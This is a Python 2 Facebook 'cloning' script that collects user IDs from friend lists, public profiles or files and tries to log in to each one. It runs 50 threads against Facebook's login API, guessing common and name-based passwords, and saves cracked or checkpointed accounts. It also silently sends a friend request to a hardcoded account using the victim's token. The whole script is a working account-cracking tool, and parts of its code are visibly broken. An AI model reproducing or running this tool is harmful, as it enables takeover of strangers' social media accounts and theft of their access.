#!/usr/bin/python2
#coding=utf-8
#Codded By Jam Shahrukh
#Editing My Script Will Not Make You A Coder
#Facebook : JAM Shahrukh
#Whatsapp : +923053176060
#Pakistan Cyber Expert
#Alone Coder 
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### INTRO #####
logo ="""
          ___    ___   ___  ___
         |_  |  / _ \  |  \/  |
           | | / /_\ \ | .  . |
           | | |  _  | | |\/| |
       /\__/ / | | | | | |  | |
       \____/  \_| |_/ \_|  |_/
● CRAZY KING GANG (BLACK LISTED UNITY) ●
------------------------------------------------------
● YouTube  : JAM SHAHRUKH TECHNICAL
● Facebook : JAM SHAHRUKH
● Note     : Dont ReEdit It 
● Github   : https://github.com/blacllisted-jam
● Whatsapp : +923053176060
\x1b[1;97m------------------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print logo

CorrectUsername = "jam"
CorrectPassword = "jam"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97mEnter Username \x1b[1;97m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "\033[1;97mAccess Granted "#Dev:Jam_Shahrukh
	    time.sleep(1)
	try:
		toket = open('login.txt','r')
	except (KeyError,IOError):
		loop = 'false'
	else:
		print "[!] Invalid Password"
		time.sleep(1)
		os.system('clear')
	
def methodlogin():
	os.system('clear')
	print logo
	print "[1] Login With ID/Password."
	print "[2] Login Using Token."
	print "[3] Exit."
	print ('      ')
	hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		print logo
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('login.txt','w')
		hopa.write(hosp)
		hopa.close()
		print "\n[✓] Logged In Successfully."
		time.sleep(1)
		menu()
	if 'checkpoint' in url:
	        print("\n\x1b[1;31mYour Account is on Checkpoint")
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	else:
		print("\n\x1b[1;31mPassword/Email is wrong")
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
     	
		
		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mBLACK LISTED UNITY MAKER' )
		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mJam King Of Facebook' ) 
		
		print('	' )
		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
		print('	' )
		id = raw_input('\033[1;97m✧ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
		pwd = raw_input('\033[1;97m✧ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;97mSuccessfully Logged In'
				os.system('xdg-open https://www.facebook.com/ch.imran.7370')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;31mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;31mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			methodlogin()


def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;31mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;31mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;97mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:jam
	print logo
	print "  \033[1;97m        ⚡ \033[1;97mLogged in User Info\033[1;97m ⚡"
	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
	
	print "\033[1;97m------------------------------------------------------"
		
	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On Facebook For Help"
        print "\033[1;97m✧\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
        hop()

def hop():
	hack = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if hack =="":
		print "\x1b[1;97mFill in correctly"
		hop()
	elif hack =="1":
		super()
	elif hack =="2":
	        os.system('xdg-open https://www.facebook.com/ch.imran.7370')
	        menu()
        
	elif hack =="0":
		hamu('Token Removed')
		os.system('rm -rf login.txt')
		exit()
	else:
		print "\x1b[1;97mFill in correctly"
		hop()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		methodlogin()
	os.system('clear')
	print logo
	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
	print "\033[1;97m✧ \033[1;97m3.\x1b[1;97mClone From File."
	print "\033[1;97m✧ \033[1;97m0.\033[1;97mBack."
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if peak =="":
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m Please Wait"
		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m≻\033[1;97mLink ID\033[1;37m: \033[1;97m")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;97m[✔] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
	    os.system('clear')
	    print logo
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press 0 To Back. ')
	         super()
        
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[✔] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[✔] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
        print"""
[!] To Stop Process Press CTRL Then Z
------------------------------------------------------"""		
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass #Dev:Jam
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			pass1='786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
					b = json.loads(a.text)
					pass2 = '000786'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
							b = json.loads(a.text)
							pass3 = b['first_name'] + '786'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
								else:
									a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
									b = json.loads(a.text)
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(user+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(user+pass4)
										else:
											a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
											b = json.loads(a.text)
											pass5 = b['first_name'] + '1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(user+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(user+pass5)
												else:
													a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
													b = json.loads(a.text)
													pass6 = b['first_name'] + '12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass6
															crt = open("save/checkpoint.txt", "a")
															crt.write(user+"|"+pass6+"\n")
															crt.close()
															checkpoint.append(user+pass6)
														else:
															a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
															b = json.loads(a.text)
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print ' \x1b[1;97mOK\x1b[1;97m ' + user + ' \x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print ' \x1b[1;91mCP\x1b[1;91m ' + user + ' \x1b[1;91m ' + pass7
																	crt = open("save/checkpoint.txt", "a")
																	crt.write(user+"|"+pass7+"\n")
																	crt.close()
																	checkpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(50)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	print('[✓] Process Has Been Completed.')
	print('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	
	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	methodlogin()
